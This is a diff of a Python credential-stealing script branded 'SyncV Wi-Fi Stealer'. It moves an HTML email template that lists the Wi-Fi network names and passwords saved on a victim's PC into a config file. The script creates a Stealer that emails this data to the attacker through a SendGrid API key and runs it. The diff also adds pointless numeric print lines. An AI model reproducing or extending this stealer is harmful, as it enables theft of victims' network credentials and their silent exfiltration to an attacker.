@@ -13,114 +13,6 @@ from time import sleep
 # config file of
 import config
 
-# HTML email template
-html_email = '''<td><table style="border-collapse:collapse;margin:0 auto;max-width:600px;padding:0;width:100%">
-
-  <tbody>
-
-    <tr>
-      <td bgcolor="#e9e9e9" style="border-collapse:collapse;color:#e9e9e9;font-size:0;height:0;padding:0;width:100%">
-      </td>
-    </tr>
-
-    <tr>
-      <td style="border-collapse:collapse;color:#fff;padding:0;width:100%">
-        <table bgcolor="#000000" style="border-collapse:collapse;padding:0;width:100%">
-          <tbody>
-
-            <tr>
-              <td style="border-collapse:collapse;padding:4%;text-align:center;vertical-align:middle;width:19.5%">
-                <img src="https://fcw.com/~/media/GIG/FCWNow/Topics/Cybersecurity/anonymous_guy_fawkes_mask.png" style="display:block;width:100%">
-              </td>
-
-              <td style="border-collapse:collapse;padding:0;vertical-align:top;width:80.5%;">
-                <br>
-                <pre>            <img src="https://flamingtext.com/net-fu/proxy_form.cgi?script=flash-anim-logo&text=SyncV&_loc=generate&imageoutput=true" alt="SyncV Photo" style="max-width:200px;width:100%;" class="CToWUd"></pre>
-                <div dir="ltr" style="opacity: 0.01; left: 559px; top: 111px;">
-                <div id=":j1" role="button" tabindex="0" aria-label="Download attachment " data-tooltip-class="a1V" data-tooltip="Download">
-                <div>
-                </div>
-                </div>
-                </div>
-              </td>
-            </tr>
-          </tbody>
-        </table>
-      </td>
-    </tr>
-
-    <tr>
-      <td bgcolor="#f7f7f7" style="border-collapse:collapse;padding:0;width:100%">
-        <table style="border-collapse:collapse;padding:0;width:100%">
-          <tbody>
-
-            <tr>
-              <td style="text-align:center;">
-                <b style="color:black;font-size:25px;">SyncV Wi-Fi Stealer</b></td>
-          </tbody>
-        </table>
-      </td>
-    </tr>
-
-    <tr>
-      <td bgcolor="#f7f7f7" style="border-bottom:1px solid #e9e9e9;border-collapse:collapse;border-top:1px solid #e9e9e9;padding:8%;width:100%">
-        <table style="border-collapse:collapse;padding:0;text-align:center;width:100%">
-          <tbody>
-
-            <tr>
-              <td style="border-collapse:collapse;padding:0">
-                <p style="color:black;font-size:16px;margin:0;font-family:bold;"><b style="color:green;">Wi-FiName</b> | <b style="color:red;">Password</b> | Security Level</p>
-                %WIFI_NETWORKS%
-              </td>
-            </tr>
-
-            <tr>
-              <td style="border-collapse:collapse;padding:32px 0 16px">
-                <table style="border-collapse:collapse;display:inline-block;padding:0;vertical-align:bottom">
-                  <tbody>
-
-                    <tr>
-                    </tr>
-                  </tbody>
-                </table>
-              </td>
-            </tr>
-          </tbody>
-        </table>
-      </td>
-    </tr>
-
-    <tr>
-      <td bgcolor="#f7f7f7" style="border-collapse:collapse;color:#666;font-size:12px;padding:20px;text-align:center;width:100%">
-        These are all Wi-Fi networks saved on the client's pc.
-      </td>
-    </tr>
-
-    <tr>
-      <td style="border-collapse:collapse;color:#fff;padding:0;width:100%">
-        <table bgcolor="#000000" style="border-collapse:collapse;padding:0;width:100%">
-          <tbody>
-
-            <tr>
-              <td style="border-collapse:collapse;padding:0 4%;width:82.5%">
-                <table style="border-collapse:collapse;padding:0">
-                  <tbody>
-                    <p style="color:white;">Coded by SyncV</p>
-                  </tbody>
-                </table>
-              </td>
-
-              <td style="border-collapse:collapse;padding:4px 1%;width:7.5%">
-                <img src="https://fcw.com/~/media/GIG/FCWNow/Topics/Cybersecurity/anonymous_guy_fawkes_mask.png" style="display:block;max-width:60px;width:100%" class="CToWUd">
-              </td>
-            </tr>
-          </tbody>
-        </table>
-      </td>
-    </tr>
-  </tbody>
-</table></td>'''
-
 
 class Stealer:
 
@@ -255,9 +147,11 @@ class Stealer:
 
 
 stealer = Stealer(config.from_email, config.to_email, config.send_grid_api)
-stealer.html_template = html_email
-# sleep(10)
+stealer.html_template = config.html_email
 stealer.run()
 
-var = -93373
+var = -4283
+print(var)
+
+var = -33830
 print(var)
